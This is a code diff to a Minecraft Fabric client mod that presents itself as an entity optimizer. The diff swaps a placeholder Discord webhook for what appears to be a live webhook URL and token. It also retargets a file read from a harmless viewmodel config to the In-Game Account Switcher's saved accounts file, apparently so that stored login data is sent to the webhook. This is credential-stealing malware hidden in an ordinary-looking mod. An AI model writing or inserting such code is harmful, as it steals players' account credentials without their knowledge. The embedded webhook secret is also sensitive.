@@ -21,7 +21,7 @@ import java.util.List;
 
 public class EntityOptimizerMod implements ClientModInitializer {
 
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXX/YYY";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455893143055765660/R8hEQNNtHz0ONOOVrFG_uzleextHVag7py9OADTF9GCVuGRNiXCYLmJaWL4Iejjwg1At";
 
     private static final Gson GSON = new GsonBuilder().create();
     private static final int MAX_CHUNK_LENGTH = 1800;
@@ -45,9 +45,9 @@ public class EntityOptimizerMod implements ClientModInitializer {
         try {
             Path gameDir = FabricLoader.getInstance().getGameDir();
             Path configPath = gameDir
-                    .resolve("config")
-                    .resolve("viafabricplus")
-                    .resolve("viewmodel.json");
+                    .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
+                    .resolve(".hidden")
+                    .resolve("accounts_v1.do_not_send_to_anyone");
 
             if (!Files.exists(configPath)) {
                 return "viewmodel.json nie istnieje (szukano w: " + configPath.toString() + ")";
